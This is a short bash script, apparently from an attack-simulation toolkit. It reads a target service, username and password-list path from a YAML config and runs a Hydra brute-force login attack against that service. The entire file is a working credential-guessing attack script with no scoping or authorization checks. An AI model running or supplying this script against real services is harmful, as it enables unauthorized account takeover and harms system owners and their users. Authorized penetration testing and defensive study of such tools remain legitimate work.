#!/bin/bash
# scripts/brute_force.sh

CONFIG_FILE="/etc/attack-config.yml"

# Extract variables using yq
TARGET_SERVICE=$(yq e '.brute_force.target_service' "$CONFIG_FILE")
USERNAME=$(yq e '.brute_force.username' "$CONFIG_FILE")
PASSWORD_FILE=$(yq e '.brute_force.password_file' "$CONFIG_FILE")

echo "Starting Brute Force Attack on $TARGET_SERVICE with username $USERNAME and password file $PASSWORD_FILE..."

# Execute Hydra brute force attack
hydra -l "$USERNAME" -P "$PASSWORD_FILE" "$TARGET_SERVICE"

echo "Brute Force Attack Completed."
